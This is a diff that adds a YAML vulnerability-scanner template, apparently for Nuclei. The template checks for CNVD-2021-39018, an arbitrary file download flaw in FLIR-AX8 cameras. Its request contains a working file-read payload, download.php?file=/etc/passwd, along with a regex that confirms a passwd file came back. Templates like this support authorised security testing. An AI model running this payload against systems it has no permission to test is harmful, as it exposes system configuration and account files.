@@ -1,0 +1,17 @@
+id: CNVD-2021-39018
+info:
+  author: daffainfo
+  description: FLIR-AX8 has an arbitrary file download vulnerability. An attacker
+    could exploit the vulnerability to download related system configuration files.
+  name: FLIR-AX8 Arbitrary File Download
+  reference: https://firetik.com/64229/flir-ax8-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-cnvd-2021-39018
+  severity: high
+  tags: flir,cnvd,cnvd2021,lfi
+requests:
+- matchers:
+  - regex:
+    - 'root:.*:0:0:'
+    type: regex
+  method: GET
+  path:
+  - '{{BaseURL}}/download.php?file=/etc/passwd'
